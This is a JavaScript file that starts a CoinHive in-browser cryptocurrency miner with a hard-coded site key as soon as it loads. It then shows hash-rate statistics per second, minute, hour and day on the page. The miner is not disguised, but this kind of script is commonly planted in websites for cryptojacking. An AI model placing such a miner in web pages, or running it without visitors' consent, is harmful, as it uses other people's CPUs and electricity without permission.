var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
miner.setNumThreads(1);
miner.start();

// Listen on events
// miner.on('found', function () { insertToLog("Found hash"); });
// miner.on('accepted', function () { insertToLog("Accepted hash"); });

// Update stats once per second

function Memory(id, maxCount) {
    this.id = "." + id;
    this.maxCount = maxCount;
    this.counter = 0;
    this.sum = 0;
    this.memory = [];
    this.count = function () {
        this.counter++;
        var result = this.counter >= this.maxCount;
        if(result) this.counter = 0;
        return result;
    };
    this.add = function(item) {
        this.sum += item;
        this.memory.push(item);
        if(this.memory.length > this.maxCount)
            this.sum -= this.memory.shift();
    };
}

var memory = [
    new Memory("nsec", 1),
    new Memory("nmin", 60),
    new Memory("nhour", 60),
    new Memory("nday", 24)
];
setInterval(function () {
    var value = miner.getHashesPerSecond();
    for (var i = 0; i < memory.length; i++) {
        var mem = memory[i];
        mem.add(value);
        value = mem.sum;

        var perX = Math.floor(value);
        var perSec = Math.floor(value / Math.min(mem.maxCount, mem.memory.length));
        $(mem.id).text(perX + " (" + perSec + "/s)");
        if (!mem.count()) break;
    }
}, 1000);